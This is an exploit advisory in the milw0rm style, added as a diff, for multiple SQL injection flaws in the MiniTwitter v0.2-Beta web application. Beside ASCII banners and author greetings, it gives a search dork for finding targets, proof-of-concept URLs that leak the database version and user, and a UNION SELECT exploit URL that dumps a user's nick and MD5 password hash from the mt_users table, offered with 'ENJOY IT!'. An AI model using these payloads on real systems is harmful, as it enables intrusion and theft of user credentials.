@@ -1,0 +1,121 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	     MULTIPLE SQL INJECTION VULNERABILITIES		      	     |
+|--------------------------------------------------------------------------------------------|
+|                         	|    MiniTwitter v0.2-Beta     |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://mt.bioscriptsdb.com/          				                     |
+|-->DOWNLOAD: http://sourceforge.net/projects/minitt/           	                     |
+|-->DEMO: http://www.bioscripts.net/minitwitter/index.php   	     			     |
+|-->CATEGORY: Social Networking								     |
+|-->DESCRIPTION: Your business needs a private twitter. You can add...		       	     |
+|		several twitters account and use this twitter as a buckup of all...	     |
+|-->RELEASED: 2009-04-30								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORK: "BioScripts"							                     |
+|-->CATEGORY: SQL INJECTION (SQLi)						             |
+|-->AFFECT VERSION: <= 0.2 Beta				 			             |
+|-->Discovered Bug date: 2009-04-30							     |
+|-->Reported Bug date: 2009-04-30							     |
+|-->Fixed bug date: 2009-05-01								     |
+|-->Info patch (0.3 Beta): http://sourceforge.net/projects/minitt/  			     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+##############################
+//////////////////////////////
+
+SQL INJECTION (SQLi):
+
+/////////////////////////////
+##############################
+
+
+
+<<<<---------++++++++++++++ Condition-1: magic_quotes_gpc=off +++++++++++++++++--------->>>>
+
+<<<<---------++++++++++++++++ Condition-2: Be register user +++++++++++++++++++--------->>>>
+
+
+
+This aplication is completely vulnerable to sql injection.
+
+
+-----
+PoC:
+-----
+
+
+File: index.php Var: GET var 'user' -->
+
+
+http://[HOST]/[HOME_PATH]/index.php?user=2%27+UNION+ALL+SELECT+1,version()/*
+
+
+Return --> Database version.
+
+
+File: inc/rss.php Var: GET var 'user' -->
+
+
+http://[HOST]/[HOME_PATH]/rss.php?user=2%27+UNION+ALL+SELECT+user(),2/*
+
+
+Return --> Database user.
+
+
+---------
+EXPLOIT:
+---------
+
+
+http://[HOST]/[HOME_PATH]/index.php?user=2%27+UNION+ALL+SELECT+2,concat(nick,0x3A3A3A,password)+FROM+mt_users+WHERE+id_usr=1/*
+
+
+Return --> nick:::password(md5 hash)
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+##   GREETZ TO: JosS, Ulises2k and all SPANISH Hack3Rs community!    ##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-01]
